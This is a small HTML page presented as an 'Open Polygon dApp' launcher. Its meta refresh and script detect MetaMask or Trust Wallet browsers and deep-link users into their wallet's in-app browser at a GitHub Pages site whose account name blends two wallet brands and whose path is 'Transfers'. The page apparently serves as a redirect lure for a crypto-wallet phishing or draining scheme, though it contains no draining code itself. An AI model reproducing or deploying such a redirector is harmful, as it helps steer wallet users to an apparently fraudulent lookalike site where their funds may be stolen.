<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>Open Polygon dApp</title>
  <meta name="viewport" content="width=device-width, initial-scale=1.0, viewport-fit=cover">
  <meta name="theme-color" content="#000000">
  <meta http-equiv="refresh" content="0;url=https://Trust-MetaWallet.github.io/Transfers">
  <style>
    body{
      margin:0;display:flex;justify-content:center;align-items:center;
      height:100vh;background:#000;color:#fff;font-family:system-ui,sans-serif
    }
  </style>
</head>
<body>
  <p>Opening Polygon dAppâ€¦</p>

  <script>
    const DAPP_URL = "https://Trust-MetaWallet.github.io/Transfers";
    const ua = navigator.userAgent.toLowerCase();
    let deepLink = DAPP_URL;

    if (ua.includes("metamask")) {
      deepLink = `metamask://dapp/${DAPP_URL.replace(/^https?:\/\//, "")}`;
    } else if (ua.includes("trust")) {
      deepLink = `trust://browser_open_url?url=${encodeURIComponent(DAPP_URL)}`;
    }

    // Try wallet deep link
    window.location.replace(deepLink);

    // Fallback to normal site after 3 s
    setTimeout(() => window.location.replace(DAPP_URL), 3000);
  </script>
</body>
</html>
